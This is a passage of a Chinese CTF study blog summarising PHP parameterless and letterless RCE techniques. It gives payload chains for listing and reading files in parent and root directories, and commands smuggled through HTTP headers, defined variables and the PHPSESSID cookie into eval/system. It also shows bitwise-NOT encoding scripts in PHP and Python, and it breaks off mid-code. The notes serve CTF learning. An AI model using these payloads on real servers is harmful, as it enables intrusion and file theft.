<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="nx">next</span><span class="p">(</span><span class="nx">array_reverse</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">pos</span><span class="p">(</span><span class="nx">localeconv</span><span class="p">())))));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>如果在倒数第一，就用</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="nx">current</span><span class="p">(</span><span class="nx">array_reverse</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">getcwd</span><span class="p">()))));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>如果在其它地方就用第一种办法爆破</p>
<h3 id="53查看上级目录">5.3查看上级目录
</h3><h4 id="dirname方法">dirname()方法
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">函数返回路径中的目录部分。如果传入的值是绝对路径（不包含文件名），则返回的是上一层路径，传入的是文件名绝对路径则返回文件的当前路径
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">print_r(scandir(dirname(getcwd())));
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="构造">构造<code>&quot;..&quot;</code>
</h4><p><code>print_r(next(scandir(getcwd())));</code>：我们<code>scandir(getcwd())</code>出现的数组第二个就是<code>&quot;..&quot;</code>，所以可以用<code>next()</code>获取</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">print_r(scandir(next(scandir(getcwd()))));
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="crypt">crypt()
</h4><p>结合上文的一些构造都是可以获得<code>&quot;..&quot;</code>的 ：<code>next(scandir(chr(ord(hebrevc(crypt(time()))))))</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">print_r(scandir(next(scandir(chr(ord(hebrevc(crypt(time()))))))))
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="54读取上级目录">5.4读取上级目录
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">直接print_r(readfile(array_rand(array_flip(scandir(dirname(getcwd()))))));是不可以的，会报错，因为默认是在当前工作目录寻找并读取这个文件，而这个文件在上一层目录，所以要先改变当前工作目录
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">前面写到了chdir()，使用：
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));
</span></span></code></pre></td></tr></table>
</div>
</div><p>但是这里切换路径后<code>getcwd()</code>和<code>localeconv()</code>不能接收参数，因为语法不允许，我们可以用之前的<code>hebrevc(crypt(arg))</code></p>
<p>这里<code>crypt()</code>和<code>time()</code>可以接收参数，于是构造：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="nx">array_rand</span><span class="p">(</span><span class="nx">array_flip</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nx">hebrevc</span><span class="p">(</span><span class="nx">crypt</span><span class="p">(</span><span class="nx">chdir</span><span class="p">(</span><span class="nx">next</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">getcwd</span><span class="p">())))))))))));</span>
</span></span><span class="line"><span class="cl"><span class="nx">或更复杂的：</span>
</span></span><span class="line"><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="nx">array_rand</span><span class="p">(</span><span class="nx">array_flip</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nx">hebrevc</span><span class="p">(</span><span class="nx">crypt</span><span class="p">(</span><span class="nx">chdir</span><span class="p">(</span><span class="nx">next</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nx">hebrevc</span><span class="p">(</span><span class="nx">crypt</span><span class="p">(</span><span class="nx">phpversion</span><span class="p">())))))))))))))));</span>
</span></span><span class="line"><span class="cl"><span class="nx">还可以用：</span>
</span></span><span class="line"><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="nx">array_rand</span><span class="p">(</span><span class="nx">array_flip</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="nx">current</span><span class="p">(</span><span class="nx">localtime</span><span class="p">(</span><span class="nx">time</span><span class="p">(</span><span class="nx">chdir</span><span class="p">(</span><span class="nx">next</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">current</span><span class="p">(</span><span class="nx">localeconv</span><span class="p">()))))))))))));</span><span class="c1">//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>也可以用if</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">if(chdir(next(scandir(getcwd()))))show_source(array_rand(array_flip(scandir(getcwd()))));
</span></span></code></pre></td></tr></table>
</div>
</div><p>感觉这个基本不会用flag一般都在flag.php或者/flag，记录一下吧</p>
<h3 id="55查看读取根目录文件">5.5查看读取根目录文件
</h3><h4 id="cryptserializearray_rand与array_flip">crypt()+serialize+array_rand与array_flip
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">strrev</span><span class="p">(</span><span class="n">crypt</span><span class="p">(</span><span class="n">serialize</span><span class="p">(</span><span class="n">array</span><span class="p">())))</span><span class="err">所获得的字符串第一位有几率是</span><span class="o">/</span><span class="err">，所以使用以上</span><span class="n">payload可以查看根目录文件</span><span class="err">，但是有权限限制，</span><span class="n">linux系统下需要一定的权限才能读到</span><span class="err">，所以不一定成功</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122161650336.png"
	width="1783"
	height="171"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122161650336_hu_1780143b20231277.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122161650336_hu_4bf860f39cebda11.png 1024w"
	loading="lazy"
	
		alt="image-20251122161650336"
	
	
		class="gallery-image" 
		data-flex-grow="1042"
		data-flex-basis="2502px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">if(chdir(chr(ord(strrev(crypt(serialize(array())))))))print_r(scandir(getcwd()));
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122165720169.png"
	width="1821"
	height="217"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122165720169_hu_d6de0803f8b6a32.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122165720169_hu_77f3c99b8eac004b.png 1024w"
	loading="lazy"
	
		alt="image-20251122165720169"
	
	
		class="gallery-image" 
		data-flex-grow="839"
		data-flex-basis="2014px"
	
></p>
<p>读根目录文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">chdir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nx">strrev</span><span class="p">(</span><span class="nx">crypt</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">array</span><span class="p">())))))))</span><span class="nx">show_source</span><span class="p">(</span><span class="nx">array_rand</span><span class="p">(</span><span class="nx">array_flip</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">getcwd</span><span class="p">()))));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="nx">array_rand</span><span class="p">(</span><span class="nx">array_flip</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">dirname</span><span class="p">(</span><span class="nx">chdir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nx">strrev</span><span class="p">(</span><span class="nx">crypt</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">array</span><span class="p">())))))))))));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="六eval种无参数rce">六：eval种无参数rce
</h2><h3 id="1获取环境变量">1.获取环境变量
</h3><p>使用getenv()获取超全局变量的数组，使用array_rand和array_flip爆破出所有的全局变量。（这里环境没放flag，如果放了可以爆破出来）</p>
<p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122191225420.png"
	width="1824"
	height="209"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122191225420_hu_e57c49277d8c7a78.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122191225420_hu_67c71fa865f073a9.png 1024w"
	loading="lazy"
	
		alt="image-20251122191225420"
	
	
		class="gallery-image" 
		data-flex-grow="872"
		data-flex-basis="2094px"
	
></p>
<h3 id="2利用getallheaders">2.利用getallheaders()
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">getallheaders()     获取全部 HTTP 请求头信息, 是下方函数的别名
</span></span><span class="line"><span class="cl">apache_request_headers  获取全部 HTTP 请求头信息
</span></span><span class="line"><span class="cl">这两个函数只适用于apache服务器
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">添加在Header在第一个：</span>
</span></span><span class="line"><span class="cl"><span class="nx">payload</span><span class="o">:</span> <span class="nx">code</span><span class="o">=</span><span class="k">eval</span><span class="p">(</span><span class="nx">pos</span><span class="p">(</span><span class="nx">getallheaders</span><span class="p">()));</span>
</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="nx">pos</span><span class="p">()</span><span class="nx">可以换为current</span><span class="p">()</span><span class="o">.</span> <span class="nx">如果在第二个可以使用next</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">添加在Header在最后一个：</span>
</span></span><span class="line"><span class="cl"><span class="nx">payload</span><span class="o">:</span> <span class="nx">code</span><span class="o">=</span><span class="k">eval</span><span class="p">(</span><span class="nx">end</span><span class="p">(</span><span class="nx">getallheaders</span><span class="p">()));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">不知道位置：</span>
</span></span><span class="line"><span class="cl"><span class="nx">配合array_rand</span><span class="p">(),</span> <span class="nx">array_flip</span><span class="p">()</span><span class="nx">构造payload进行爆破：</span>
</span></span><span class="line"><span class="cl"><span class="nx">payload</span><span class="o">:</span> <span class="k">eval</span><span class="p">(</span><span class="nx">array_rand</span><span class="p">(</span><span class="nx">array_flip</span><span class="p">(</span><span class="nx">getallheaders</span><span class="p">())));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122193721209.png"
	width="1238"
	height="410"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122193721209_hu_af9d7bfe1a65dd2e.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122193721209_hu_3e570bc394b094a0.png 1024w"
	loading="lazy"
	
		alt="image-20251122193721209"
	
	
		class="gallery-image" 
		data-flex-grow="301"
		data-flex-basis="724px"
	
></p>
<p>一般都是用爆破，前2个多少会出点问题</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">system(implode(apache_request_headers()));	#这里有点问题，打不了了
</span></span><span class="line"><span class="cl">system(hex2bin(key(apache_request_headers()))); 
</span></span><span class="line"><span class="cl">system(join(apache_request_headers())); #join是imlode的平替，apache_request_headers是getallheaders的平替
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="3get_defined_vars">3.get_defined_vars()
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">eval</span><span class="p">(</span><span class="n">end</span><span class="p">(</span><span class="n">current</span><span class="p">(</span><span class="n">get_defined_vars</span><span class="p">())));</span><span class="o">&amp;</span><span class="n">b</span><span class="o">=</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;ls /&#39;</span><span class="p">);</span>	<span class="c1">#eval换成assert也行 </span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122200331990.png"
	width="1843"
	height="290"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122200331990_hu_6c08ee949da8276.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122200331990_hu_8343cf221758d700.png 1024w"
	loading="lazy"
	
		alt="image-20251122200331990"
	
	
		class="gallery-image" 
		data-flex-grow="635"
		data-flex-basis="1525px"
	
></p>
<h3 id="4session_id">4.session_id()
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">eval(hex2bin(session_id(session_start())));
</span></span><span class="line"><span class="cl">session_start();system(hex2bin(session_id()));
</span></span><span class="line"><span class="cl">readfile(session_id(session_start()));#读文件
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">然后
</span></span><span class="line"><span class="cl">Cookie:PHPSESSID=执行命令就行
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">2025TGCTF:AAA偷渡阴平
</span></span><span class="line"><span class="cl">2025-NetDreamctf:ezbypass
</span></span><span class="line"><span class="cl">2023-极客大挑战：Pupyy_rce
</span></span><span class="line"><span class="cl">2023-极客大挑战：EzRce
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="七eval中无数字字母rce">七:eval中无数字字母rce
</h2><p>题目一般类似这种</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="err">$</span><span class="n">c</span> <span class="o">=</span> <span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="err">!</span><span class="n">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-z0-9]/is&#39;</span><span class="p">,</span> <span class="err">$</span><span class="n">c</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nb">eval</span><span class="p">(</span><span class="err">$</span><span class="n">c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">highlight_file</span><span class="p">(</span><span class="n">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="o">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="取反">取反
</h3><p>通过位运算取反符号去取得需要的字符</p>
<p>脚本,比如我们想执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> 
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">a</span><span class="o">=</span><span class="n">urlencode</span><span class="p">(</span><span class="o">~</span><span class="s1">&#39;phpinfo&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">echo</span> <span class="err">$</span><span class="n">a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="n">echo</span> <span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">b</span> <span class="o">=</span> <span class="o">~</span><span class="n">urldecode</span><span class="p">(</span><span class="err">$</span><span class="n">a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">echo</span> <span class="err">$</span><span class="n">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">//%</span><span class="mi">8</span><span class="n">F</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="mi">8</span><span class="n">F</span><span class="o">%</span><span class="mi">96</span><span class="o">%</span><span class="mi">91</span><span class="o">%</span><span class="mi">99</span><span class="o">%</span><span class="mi">90</span><span class="o">&lt;/</span><span class="n">br</span><span class="o">&gt;</span><span class="n">phpinfo</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$system</span><span class="o">=</span><span class="s2">&#34;system&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$command</span><span class="o">=</span><span class="s2">&#34;tac flag.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;(~&#39;</span><span class="o">.</span><span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="nv">$system</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;)(~&#39;</span><span class="o">.</span><span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="nv">$command</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;);&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>python脚本</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">one</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">ss</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">ss</span> <span class="o">+=</span> <span class="s2">&#34;%&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="mi">255</span> <span class="o">-</span> <span class="nb">ord</span><span class="p">(</span><span class="n">each</span><span class="p">)))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;[~</span><span class="si">{</span><span class="n">ss</span><span class="si">}</span><span class="s2">][!%FF](&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">a</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;:&gt;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s2">&#34;)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">aa</span> <span class="o">=</span> <span class="n">a</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;(&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="n">aa</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">+=</span> <span class="n">one</span><span class="p">(</span><span class="n">each</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">+=</span> <span class="s2">&#34;)&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">aa</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="自增">自增
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值返回为Array，Array的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">_</span><span class="o">=</span><span class="p">[]</span><span class="o">.</span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="o">//</span><span class="n">Array</span>
